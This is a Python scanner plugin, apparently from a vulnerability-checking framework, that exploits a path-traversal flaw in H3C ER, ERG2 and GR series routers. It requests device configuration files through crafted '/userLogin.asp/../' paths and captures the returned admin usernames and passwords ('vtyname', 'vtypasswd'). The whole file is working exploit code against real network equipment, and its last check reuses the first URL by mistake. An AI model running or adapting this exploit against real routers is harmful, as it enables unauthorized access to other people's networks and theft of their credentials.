#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'H3C企业路由器（ER、ERG2、GR系列)任意用户登录',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-User': '?1',
      'Sec-Fetch-Dest': 'document',
      'Accept-Encoding': 'gzip, deflate',


      }
  targets = ['/userLogin.asp/../actionpolicy_status/../ER5200G2.cfg','/userLogin.asp/../actionpolicy_status/../GR-1200W.cfg','/userLogin.asp/../actionpolicy_status/../ER3200G2.cfg','/userLogin.asp/../actionpolicy_status/../ER2100n.cfg','/userLogin.asp/../actionpolicy_status/../ER2200G2.cfg']
  # for target in targets:
  url1 = url + targets[0]
  url2 = url + targets[1]
  url3 = url + targets[2]
  url4 = url + targets[3]
  url5 = url + targets[4]
  
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "vtyname" in res.text and 'vtypasswd' in res.text:
      ret['huixian'] = res.text
      ret['url'] = url1
      ret['ifbug'] = True
      res.close()
      return ret
  except:
    pass
  try:
    res=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "vtyname" in res.text and 'vtypasswd' in res.text:
      ret['huixian'] = res.text
      ret['url'] = url2
      ret['ifbug'] = True
      res.close()
      return ret
  except:
    pass
  try:
    res=requests.get(url=url3,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "vtyname" in res.text and 'vtypasswd' in res.text:
      ret['huixian'] = res.text
      ret['url'] = url3
      ret['ifbug'] = True
      res.close()
      return ret
  except:
    pass
  try:
    res=requests.get(url=url4,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "vtyname" in res.text and 'vtypasswd' in res.text:
      ret['huixian'] = res.text
      ret['url'] = url4
      ret['ifbug'] = True
      res.close()
      return ret
  except:
    pass
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "vtyname" in res.text and 'vtypasswd' in res.text:
      ret['huixian'] = res.text
      ret['url'] = url5
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret